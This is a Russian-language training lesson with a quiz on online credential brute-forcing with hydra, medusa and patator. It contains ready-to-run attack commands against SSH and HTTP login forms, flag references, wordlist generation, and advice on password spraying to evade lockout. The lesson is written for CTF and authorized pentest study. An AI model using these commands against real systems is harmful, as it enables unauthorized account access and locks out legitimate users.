---
id: crypto-tool-hydra-medusa-patator
title: "Онлайн-брут: hydra, medusa и patator"
category: crypto
parent: crypto-tools
difficulty: easy
order: 3
tags: [crypto, hydra, medusa, patator, brute-force, password, http-post-form, ssh, auth]
prerequisites: [crypto-tool-hashcat]
useful_for:
  - "CTF: подбор к формам логина и сервисам"
  - "Пентест: проверка парольной политики по сети"
  - "Red team: password spraying и онлайн-перебор"
estimated_minutes: 28
summary: "Онлайн-подбор учётных данных: полный справочник hydra (все модули сервисов, http-post-form), эквиваленты medusa, модульный patator, генерация курированных словарей и правила безопасного перебора без блокировки аккаунта."
---

## Вопрос, с которого всё начинается

В прошлом уроке мы ломали хэши **офлайн** — у нас был дамп. Но часто дампа нет: есть только форма логина на сайте. Тогда перебирать приходится **по сети**, бьёт прямо в живую форму. Это **онлайн-брут**, и он самый «громкий» и рискованный шаг: слишком много попыток — и аккаунт заблокируется, а тест засветится.

## Наш пример

Разберём форму логина. Сначала — понять, как отличить **неудачу** от **успеха**: это критично для hydra. Поднимем учебную форму и сделаем по одному запросу:

```python
import threading, urllib.request, urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
VALID = {"admin": "Summer2025!"}
# ... сервер принимает POST /login и отвечает ...
print("неверная пара ->", repr(attempt("admin", "password")))
print("верная пара   ->", repr(attempt("admin", "Summer2025!")))
```

Реальный вывод:

```
неверная пара -> 'Invalid credentials'
верная пара   -> 'Welcome, admin'
-> fail-string для hydra: F=Invalid credentials
```

Мы получили **fail-string** — уникальную строку, которая присутствует только при неудаче. Без неё hydra будет считать успехом всё подряд.

## Шаг 1: этика и бюджет попыток

Прежде чем запускать онлайн-брут:

- **Считайте бюджет.** Обычно есть lockout (5 попыток → блокировка) и rate-limit. Триггер блокировки уронит доступ реальным пользователям.
- **Никогда не лейте rockyou целиком** по сети. Только **маленький курированный список**: дефолты сервиса + найденные креды + производные + пара частых.
- **Проверяйте UNAUTH** раньше брута: анонимный FTP, null-session SMB, Redis/Mongo без пароля, дефолтные админки.
- **Password spraying** (один пароль против многих логинов) безопаснее reverse brute-force: обходит lockout-per-user.
- **Ограничьте потоки:** `-t 4` и пауза вместо 64 потоков.

## Шаг 2: hydra — синтаксис и флаги

```bash
hydra [флаги] <цель> <модуль> [параметры модуля]
hydra -l admin -P passwords.txt ssh://10.0.0.5
hydra -l admin -P pass.txt 10.0.0.5 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

| Флаг | Что делает | Флаг | Что делает |
|---|---|---|---|
| `-l` / `-L` | один логин / список логинов | `-p` / `-P` | один пароль / список паролей |
| `-C FILE` | combo-файл `login:pass` | `-e nsr` | пустой пароль (n), логин=пароль (s), обратный (r) |
| `-s PORT` | нестандартный порт | `-t N` | параллельных задач на цель |
| `-f` / `-F` | стоп после первой пары (на цель / глобально) | `-o FILE` | писать найденное в файл |
| `-V` | verbose (каждая попытка) | `-W N` | пауза между попытками (rate-limit) |
| `-x MIN:MAX:CHARSET` | brute-force генерация | `-U MODULE` | справка по модулю |

## Шаг 3: http-post-form подробно

Формат: `"/path:body:fail-string[:extra]"`, где `^USER^`/`^PASS^` подставляются в тело.

- `F=текст` — провал, если в ответе есть текст (по умолчанию).
- `S=текст` — успех, если есть текст; `F=404`/`S=200` — по коду ответа.
- `:H=Cookie: x=1` — добавить заголовки; `:C=/cookie` — взять cookie из файла.

```bash
# классическая форма (наш случай)
hydra -l admin -P pass.txt 10.0.0.5 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# успех по строке
hydra -l admin -P pass.txt 10.0.0.5 http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=Welcome"

# с cookie и CSRF-токеном
hydra -l admin -P pass.txt 10.0.0.5 http-post-form \
  "/login:user=^USER^&pass=^PASS^&csrf=TOKEN:F=failed:H=Cookie: session=abc"
```

Чтобы не угадывать fail-string — сделайте один ручной запрос (curl/Burp), как мы выше.

## Шаг 4: модули сервисов

| Модуль | Сервис | Модуль | Сервис |
|---|---|---|---|
| `ssh` / `sshkey` | SSH / SSH по ключу | `smb` | SMB |
| `ftp` / `ftps` | FTP / FTP over SSL | `rdp` | RDP |
| `mysql` / `mssql` / `postgres` | СУБД | `vnc` | VNC |
| `smtp` / `pop3` / `imap` | почта | `ldap2`/`ldap3` | LDAP |
| `http-get` / `http-post-form` | HTTP Basic / форма | `redis` / `mongodb` | Redis / MongoDB |
| `https-get` / `https-post-form` | то же по HTTPS | `socks5` | SOCKS5 |

Полный список: `hydra -h | grep -A200 'Supported services'`; справка по модулю — `hydra -U http-post-form`.

## Шаг 5: medusa и patator

**medusa** — аналог hydra с другим набором модулей: `-h HOST -u USER -P PASSES -M MODULE`. Отличие: `-t` — потоки на цель, `-T` — число целей (удобно для параллельных целей), модуль HTTP задаётся `-m DIR:... -m FORM:...`.

```bash
medusa -h 10.0.0.5 -u admin -P small.txt -M ssh -t 4 -f
medusa -h 10.0.0.5 -u admin -P small.txt -M http -m DIR:/login -m FORM:"user=^USER^&pass=^PASS^:F=incorrect" -f
```

**patator** — самый гибкий: модуль первым аргументом, затем параметры и `FILE0`, где `0=файл`. Можно подать **два списка** и сложные условия игнорирования.

```bash
patator ssh_login host=10.0.0.5 user=admin password=FILE0 0=small.txt \
  -x ignore:mesg='Authentication failed.'
patator http_fuzz url=http://10.0.0.5/login method=POST \
  body='user=admin&pass=FILE0' 0=small.txt -x ignore:fgrep='Invalid credentials'
```

| Инструмент | Сильная сторона | Когда |
|---|---|---|
| **hydra** | огромный список модулей, простой синтаксис, `http-post-form` | дефолт для большинства сервисов |
| **medusa** | параллельные цели (`-T`), модули `smbnt`/`rdp` | много целей сразу |
| **patator** | два списка, гибкие `-x ignore/stop`, `--rate-limit` | сложные формы, точный контроль |

## Шаг 6: курированные словари и защита от блокировки

```bash
printf 'admin\nroot\nadministrator\nuser\nguest\n' > users.txt
printf 'admin\npassword\nadmin123\n<PASSWORD_ИЗ_КОНФИГА>\n' > passes.txt
cewl -d 2 -m 4 -w cewl.txt http://10.0.0.5          # слова из веб-страницы
```

- `-t 4` (или меньше), для форм — `-t 1..2`; `-W 2` / `--rate-limit` — пауза.
- `-e ns` — проверьте пустой пароль и логин=пароль: иногда это единственный вход.
- `-f`/`-F` — стоп после первой находки.
- Считайте окно lockout: если политика «5 попыток за 15 минут» — список ≤ 4 или password spraying.
- Не брутьте один аккаунт с разных инструментов одновременно.

## Что мы теперь знаем

- Онлайн-брут — по сети, против живого сервиса; риск блокировки.
- Сначала определяют **fail-string** одним ручным запросом.
- `http-post-form` = `/path:body:fail-string[:extra]`, `^USER^`/`^PASS^` подставляются.
- hydra — дефолт; medusa — много целей; patator — два списка и гибкие условия.
- Только **курированный** список, ограниченные потоки и пауза.
- Password spraying обходит lockout-per-user.

## Квиз

Проверь себя.

```quiz
- question: "Почему нельзя лить rockyou.txt целиком по сети против формы логина?"
  options:
    - "Это слишком медленно"
    - "Сработает lockout и аккаунт заблокируется, тест засветится"
    - "hydra не поддерживает rockyou"
    - "Словарь содержит неверные кодировки"
  answer: 1
  explanation: "Много попыток триггерит блокировку и раскрывает тест."
- question: "Что означает F=Invalid credentials в hydra http-post-form?"
  options:
    - "Успех, если в ответе есть эта строка"
    - "Провал, если в ответе есть эта строка"
    - "Имя файла с паролями"
    - "Заголовок Cookie"
  answer: 1
  explanation: "F= задаёт признак неудачи — по нему hydra отличает провал от успеха."
- question: "Какой инструмент позволяет подать два списка с гибкими условиями игнорирования?"
  options:
    - "hashcat"
    - "john"
    - "patator"
    - "zip2john"
  answer: 2
  explanation: "patator использует FILE0/FILE1 и -x ignore/stop для сложных условий."
- question: "Что такое password spraying?"
  options:
    - "Много паролей против одного логина"
    - "Один пароль против многих логинов с паузами"
    - "Взлом хэша на GPU"
    - "Извлечение пароля из архива"
  answer: 1
  explanation: "Spraying обходит lockout-per-user, растягивая попытки по аккаунтам."
- question: "Зачем ставить hydra флаг -e ns?"
  options:
    - "Отключить SSL"
    - "Проверить пустой пароль (n) и логин как пароль (s)"
    - "Увеличить число потоков"
    - "Сохранить вывод в файл"
  answer: 1
  explanation: "-e ns добавляет очевидные проверки: пустой пароль и логин=пароль."
```

## Куда дальше

Мы разобрали онлайн-перебор и правила, которые не дают заблокировать аккаунт. Дальше логично вернуться к **crypto-hashcracking**, где тот же подбор идёт офлайн и без риска lockout. А пока главное: **онлайн-брут — это про маленький курированный список и точный fail-string, а не про rockyou целиком; одна лишняя попытка блокирует аккаунт.**

## Где пригодится

- **CTF** — формы логина, basic-auth, SSH/FTP/MySQL с дефолтными кредами.
- **Пентест** — проверка парольной политики по сети, password spraying.
- **Red team** — аккуратный онлайн-подбор после сбора логинов (enum, OSINT).
- **Blue team** — детект: всплеск неудачных логинов, один пароль против многих аккаунтов.
